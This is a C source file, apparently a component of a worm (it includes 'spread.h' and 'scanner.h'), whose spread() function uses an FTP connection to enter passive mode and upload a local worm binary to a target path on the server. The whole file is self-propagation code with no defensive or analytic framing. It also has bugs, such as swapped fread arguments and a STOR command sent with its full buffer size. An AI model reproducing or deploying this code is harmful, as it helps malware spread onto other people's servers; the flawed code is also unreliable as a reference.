#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
//---
#include "spread.h"
#include "scanner.h"

int spread(int fd, const char *worm, const char *dest) {
  FILE *fp;
  int datafd;
  char buffer[256];
  char stor[64], answer[64], address[64];
  char *pasv_params;
  unsigned int addr[4];
  unsigned int port[2];
  struct sockaddr_in data_addr;
  size_t read_bytes;

  if(send(fd, "TYPE I\n", 7, 0) < 0) {
    perror("send");
    return -1;
  }

  if(recv(fd, answer, sizeof answer, 0) < 0) {
    perror("recv");
    return -1;
  }

  if(send(fd, "PASV\n", 5, 0) < 0) {
    perror("send");
    return -1;
  }

  if(recv(fd, answer, sizeof answer, 0) < 0) {
    perror("recv");
    return -1;
  }

  if(strncmp(answer, "227", 3) != 0) {
    fprintf(stderr, "Error: Passive mode answer not received!\n");
    return -1;
  }

  snprintf(stor, sizeof stor, "STOR %s\n", dest);
  if(send(fd, stor, sizeof stor, 0) < 0) {
    perror("send");
    return -1;
  }

  pasv_params = strfind(answer, '(');
  sscanf(pasv_params, "(%u,%u,%u,%u,%u,%u)", &addr[0], &addr[1], &addr[2], &addr[3], &port[0], &port[1]);
  snprintf(address, sizeof address, "%u.%u.%u.%u", addr[0], addr[1], addr[2], addr[3]);

  data_addr.sin_family = AF_INET;
  data_addr.sin_port = htons(port[0] * 256 + port[1]);
  data_addr.sin_addr.s_addr = inet_addr(address);  
  memset(data_addr.sin_zero, 0, sizeof(data_addr.sin_zero));

  if((datafd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
    perror("socket");
    return -1;
  }

  if(connect(datafd, (struct sockaddr *) &data_addr, sizeof(struct sockaddr_in)) < 0) {
    perror("connect");
    return -1;
  }

  if((fp = fopen(worm, "rb")) == NULL) {
    fprintf(stderr, "Error: Opening file \"%s\" failed!\n", worm);
    return -1;
  }

  while((read_bytes = fread(buffer, sizeof buffer, sizeof(char), fp)) > 0) {
    write(datafd, buffer, read_bytes);
  }

  close(datafd);
  fclose(fp);
  return 0;
}
